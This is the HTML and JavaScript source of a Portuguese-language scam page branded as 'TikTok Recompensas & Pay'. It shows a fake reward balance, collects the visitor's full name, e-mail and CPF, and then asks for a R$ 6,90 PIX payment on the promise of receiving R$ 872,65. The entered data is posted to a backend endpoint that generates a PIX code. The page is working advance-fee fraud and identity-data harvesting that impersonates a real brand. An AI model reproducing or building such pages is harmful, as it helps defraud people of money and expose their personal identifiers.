<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TikTok Recompensas & Pay</title>
  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
</head>
<body class="bg-slate-50 min-h-screen text-slate-800 flex flex-col justify-between font-sans">
  <header class="w-full bg-white border-b border-slate-100 py-3 px-4 sticky top-0 z-50 flex justify-between items-center shadow-xs">
    <div class="flex items-center space-x-2">
      <span class="font-black text-lg tracking-tight">TikTok</span>
    </div>
    <div class="bg-pink-50 border border-pink-100 px-3.5 py-1.5 rounded-full flex items-center space-x-2">
      <span class="text-xs font-medium text-pink-600 uppercase">Saldo:</span>
      <span id="header-balance" class="font-bold text-pink-600 text-sm">R$ 0,00</span>
    </div>
  </header>

  <main class="w-full max-w-md mx-auto p-4 flex-1 flex flex-col justify-center">
    <!-- ETAPA 1 -->
    <div id="step-1" class="bg-white rounded-3xl p-6 shadow-xl border border-slate-100 text-center space-y-6">
      <h1 class="text-2xl font-bold">Verificação de Idade</h1>
      <p class="text-sm text-slate-500">Você possui mais de 18 anos para receber via PIX?</p>
      <button onclick="switchStep(2)" class="w-full bg-pink-600 text-white font-semibold py-3.5 rounded-xl cursor-pointer">Sim, tenho mais de 18 anos</button>
    </div>

    <!-- ETAPA 2 (SAQUE) -->
    <div id="step-2" class="hidden bg-white rounded-3xl p-6 shadow-xl border border-slate-100 space-y-4">
      <h2 class="text-xl font-bold">Dados para Recebimento</h2>
      <input type="text" id="pay-name" placeholder="Seu Nome Completo" class="w-full bg-slate-50 border p-3 rounded-xl text-sm">
      <input type="email" id="pay-email" placeholder="Seu E-mail" class="w-full bg-slate-50 border p-3 rounded-xl text-sm">
      <input type="text" id="pay-cpf" placeholder="CPF" class="w-full bg-slate-50 border p-3 rounded-xl text-sm">
      <button id="btn-pay-action" onclick="finishOrder()" class="w-full bg-pink-600 text-white font-semibold py-3.5 rounded-xl cursor-pointer">PAGAR R$ 6,90 E RECEBER R$ 872,65</button>
    </div>

    <!-- ETAPA 3 (PIX) -->
    <div id="step-3" class="hidden bg-white rounded-3xl p-6 shadow-xl border border-slate-100 space-y-4 text-center">
      <h2 class="text-xl font-bold">Pix Gerado</h2>
      <textarea id="pix-code-text" readonly class="w-full h-28 bg-slate-50 border p-3 text-xs font-mono rounded-xl break-all" placeholder="Gerando código do Pix..."></textarea>
      <button onclick="copyPixCode()" id="btn-copy-pix" class="w-full bg-slate-900 text-white font-semibold py-3 rounded-xl text-sm cursor-pointer">📋 Copiar Código Pix</button>
    </div>
  </main>

  <script>
    function switchStep(s) {
      document.querySelectorAll('main > div').forEach(el => el.classList.add('hidden'));
      document.getElementById('step-' + s).classList.remove('hidden');
    }

    async function finishOrder() {
      const name = document.getElementById('pay-name').value;
      const email = document.getElementById('pay-email').value;
      const cpf = document.getElementById('pay-cpf').value;

      if (!name || !email) return alert("Preencha nome e e-mail.");

      const btn = document.getElementById('btn-pay-action');
      btn.disabled = true;
      btn.innerText = "Gerando Pix...";
      switchStep(3);

      try {
        const res = await fetch('/api/gerar-pix', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ name, email, cpf })
        });
        const data = await res.json();
        if (data.pix_code) {
          document.getElementById('pix-code-text').value = data.pix_code;
        } else {
          alert("Erro: " + (data.error || "Não foi possível gerar o Pix"));
        }
      } catch (e) {
        alert("Erro na requisição.");
      } finally {
        btn.disabled = false;
        btn.innerText = "PAGAR R$ 6,90 E RECEBER R$ 872,65";
      }
    }

    function copyPixCode() {
      const copyText = document.getElementById("pix-code-text");
      copyText.select();
      navigator.clipboard.writeText(copyText.value);
      alert("Código Pix Copiado!");
    }
  </script>
</body>
</html>
